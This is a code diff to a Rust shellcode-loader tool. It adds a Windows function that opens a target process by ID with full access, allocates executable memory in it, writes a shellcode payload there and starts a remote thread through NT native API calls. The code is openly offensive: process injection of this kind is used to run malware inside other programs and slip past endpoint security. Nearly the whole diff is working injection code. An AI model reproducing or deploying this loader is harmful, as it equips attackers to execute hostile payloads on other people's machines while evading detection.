@@ -15,13 +15,19 @@ use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS
 
 use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
 use ntapi::ntpsapi::{
-    NtCurrentProcess, NtCurrentThread, NtQueueApcThread, NtTestAlert, PPS_APC_ROUTINE,
+    NtCurrentProcess, NtCurrentThread, NtCreateThreadEx, NtOpenProcess, NtQueueApcThread, NtTestAlert, PPS_APC_ROUTINE, PPS_ATTRIBUTE_LIST
 };
 use ntapi::winapi::ctypes::c_void;
 
 use std::ptr::null_mut;
 
+use std::mem::size_of;
 
+use winapi::shared::ntdef::{FALSE, HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES, PHANDLE};
+
+
+use ntapi::ntapi_base::CLIENT_ID;
+use ntapi::ntobapi::NtClose;
 
 use bstr::ByteSlice;
 use serde_derive::{Deserialize, Serialize};
@@ -57,6 +63,19 @@ pub struct AESShellCode {
 
 const SHELLCODE_EGG_THING: &[u8] =
     b"you mirin mah shellcode brah? rust lang best lang, c is for nerds";
+
+fn new_object_attributes() -> OBJECT_ATTRIBUTES {
+    let mut oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
+        Length: size_of::<OBJECT_ATTRIBUTES>() as _,
+        RootDirectory: NULL,
+        ObjectName: NULL as _,
+        Attributes: 0,
+        SecurityDescriptor: NULL,
+        SecurityQualityOfService: NULL,
+    };
+
+    oa
+}
 
 impl ShellCode {
     pub fn from_file(input_path: &str) -> ShellCode {
@@ -331,6 +350,77 @@ impl ShellCode {
             NtTestAlert();
         }
     }
+
+    #[cfg(unix)]
+    pub fn load_CreateRemoteThread_directSyscalls(pid: u64) {
+        println!("[+] not supported on unix");
+    }
+
+    #[cfg(windows)]
+    pub fn load_CreateRemoteThread_directSyscalls(self, pid: u64) {
+
+        // needed for multiple calls
+        let mut allocstart: *mut ntapi::winapi::ctypes::c_void = std::ptr::null_mut();
+  
+
+        // needed for NtOpenProcess call
+        let mut handle: HANDLE = NULL;
+        let mut oa1 = new_object_attributes();
+        let mut cid: CLIENT_ID = CLIENT_ID {
+            UniqueProcess: pid as _,
+            UniqueThread: 0 as _,
+        };
+
+        // needed for NtCreateThreadEx call
+        let mut oa2 = new_object_attributes();
+        let mut psa: PPS_ATTRIBUTE_LIST = NULL as _;
+        let mut thandle: HANDLE = NULL;
+
+        unsafe {
+            NtOpenProcess(
+                &mut handle,                    // ProcessHandle: PHANDLE
+                PROCESS_ALL_ACCESS,             // DesiredAccess: ACCESS_MASK
+                &mut oa1,                       // ObjectAttributes: POBJECT_ATTRIBUTES
+                &mut cid                        // ClientId: PCLIENT_ID
+            );
+
+            NtAllocateVirtualMemory(
+                handle,                         // ProcessHandle: HANDLE
+                &mut allocstart,                // BaseAddress: *mut PVOID
+                0,                              // ZeroBits: ULONG_PTR
+                &mut self.sc.len(),          // RegionSize: PSIZE_T
+                0x00003000,                     // AllocationType: ULONG
+                0x40                            // Protect: ULONG
+            );
+
+            NtWriteVirtualMemory(
+                handle,                         // ProcessHandle: HANDLE
+                allocstart,                     // BaseAddress: PVOID
+                self.sc.as_ptr() as _,     // Buffer: PVOID
+                self.sc.len(),               // BufferSize: SIZE_T
+                std::ptr::null_mut(),           // NumberOfBytesWritten: PSIZE_T
+            );
+
+            NtCreateThreadEx(
+                &mut thandle,                   // ThreadHandle: PHANDLE
+                PROCESS_ALL_ACCESS,             // DesiredAccess: ACCESS_MASK
+                &mut oa2,                       // ObjectAttributes: POBJECT_ATTRIBUTES
+                handle,                         // ProcessHandle: HANDLE
+                allocstart,                     // StartRoutine: PVOID
+                allocstart,                     // Argument: PVOID
+                FALSE.into(),                   // CreateFlags: ULONG
+                NULL as usize,                  // ZeroBits: SIZE_T
+                NULL as usize,                  // StackSize: SIZE_T
+                NULL as usize,                  //  MaximumStackSize: SIZE_T
+                psa,                            // AttributeList: PPS_ATTRIBUTE_LIST
+            );
+
+            NtClose(
+                handle                          // Handle: HANDLE
+            );
+        }
+    }
+
 }
 
 impl XoredShellCode {
